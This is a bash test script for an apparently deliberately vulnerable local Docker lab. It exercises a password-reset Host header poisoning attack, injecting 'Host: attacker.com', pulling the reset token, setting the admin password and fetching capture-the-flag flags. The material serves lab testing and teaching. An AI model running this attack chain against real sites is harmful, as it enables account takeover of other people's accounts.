#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8090 2>/dev/null; do sleep 1; done

# Test 1: reset with normal Host header -- link uses lab hostname
OUT=$(curl -s -X POST http://127.0.0.1:8090/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@lab.internal"}' 2>/dev/null)
check "reset-password returns ok message" "$( echo "$OUT" | grep -q 'sent' && echo 1 || echo 0 )"

DEBUG=$(curl -s http://127.0.0.1:8090/debug/last-email 2>/dev/null)
check "debug endpoint shows last email" "$( echo "$DEBUG" | grep -q 'admin@lab.internal' && echo 1 || echo 0 )"

HOST_IN_LINK=$(echo "$DEBUG" | grep -oE 'http://[^/]+/' | head -1)
check "normal reset link uses lab host" "$( echo "$HOST_IN_LINK" | grep -q '127.0.0.1' && echo 1 || echo 0 )"

# Test 2: inject Host: attacker.com -- link uses attacker's domain
curl -s -X POST http://127.0.0.1:8090/reset-password \
    -H "Content-Type: application/json" \
    -H "Host: attacker.com" \
    -d '{"email": "admin@lab.internal"}' > /dev/null 2>&1

DEBUG2=$(curl -s http://127.0.0.1:8090/debug/last-email 2>/dev/null)
HOST_IN_LINK2=$(echo "$DEBUG2" | grep -oE 'http://[^/]+/' | head -1)
check "injected Host changes reset link domain" "$( echo "$HOST_IN_LINK2" | grep -q 'attacker.com' && echo 1 || echo 0 )"

# Test 3: extract token and reset password
TOKEN=$(echo "$DEBUG2" | grep -oE 'token=[0-9a-f]{32}' | cut -d= -f2)
OUT=$(curl -s "http://127.0.0.1:8090/reset?token=$TOKEN&password=hacked123" 2>/dev/null)
check "token from poisoned link is valid on real server" "$( echo "$OUT" | grep -q 'reset' && echo 1 || echo 0 )"

# Test 4: log in with new password and get flag1
COOKIE_JAR=$(mktemp /tmp/cookies-XXXXXX.txt)
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -X POST http://127.0.0.1:8090/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"hacked123"}' 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin login with new password returns flag1" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 5: access admin-data for flag2
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" http://127.0.0.1:8090/admin-data 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin-data returns flag2" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"
rm -f "$COOKIE_JAR"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
